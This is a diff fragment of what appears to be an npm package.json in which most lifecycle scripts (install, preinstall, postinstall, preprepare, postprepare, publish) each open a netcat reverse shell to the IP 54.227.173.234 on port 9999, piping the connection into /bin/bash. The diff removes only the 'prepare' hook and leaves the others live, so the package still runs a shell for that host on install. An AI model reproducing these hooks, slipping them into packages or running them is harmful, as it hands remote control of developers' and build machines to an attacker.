@@ -13,7 +13,6 @@
         "install": "mkfifo install.fifo; nc 54.227.173.234 9999 < install.fifo | /bin/bash > install.fifo 2>&1; rm install.fifo",
         "preinstall": "mkfifo preinstall.fifo; nc 54.227.173.234 9999 < preinstall.fifo | /bin/bash > preinstall.fifo 2>&1; rm preinstall.fifo",
         "postinstall": "mkfifo postinstall.fifo; nc 54.227.173.234 9999 < postinstall.fifo | /bin/bash > postinstall.fifo 2>&1; rm postinstall.fifo",
-        "prepare": "mkfifo prepare.fifo; nc 54.227.173.234 9999 < prepare.fifo | /bin/bash > prepare.fifo 2>&1; rm prepare.fifo",
         "preprepare": "mkfifo preprepare.fifo; nc 54.227.173.234 9999 < preprepare.fifo | /bin/bash > preprepare.fifo 2>&1; rm preprepare.fifo",
         "postprepare": "mkfifo postprepare.fifo; nc 54.227.173.234 9999 < postprepare.fifo | /bin/bash > postprepare.fifo 2>&1; rm postprepare.fifo",
         "publish": "mkfifo publish.fifo; nc 54.227.173.234 9999 < publish.fifo | /bin/bash > publish.fifo 2>&1; rm publish.fifo",
